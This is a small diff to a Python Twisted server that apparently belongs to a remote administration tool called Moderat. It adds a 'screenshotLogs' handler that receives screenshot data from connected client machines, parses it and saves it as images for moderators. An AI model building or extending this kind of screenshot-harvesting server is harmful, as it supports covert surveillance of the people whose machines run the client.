@@ -4,6 +4,8 @@ from twisted.internet import reactor
 from ClientsManagment import ClientsManagment
 from ModeratorsManagment import ModeratorsManagment
 
+from PhotoFactory import save_image
+
 import logging
 from logging.handlers import RotatingFileHandler
 import sys
@@ -130,6 +132,12 @@ class ModeratServerProtocol(Protocol):
                 'key':                  payload['key'],
                 'socket':               client_socket,
             }
+
+        # Data Logger
+        elif mode == 'screenshotLogs':
+            print payload
+            screen_info = ast.literal_eval(payload)
+            save_image(screen_info)
 
         else:
             log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
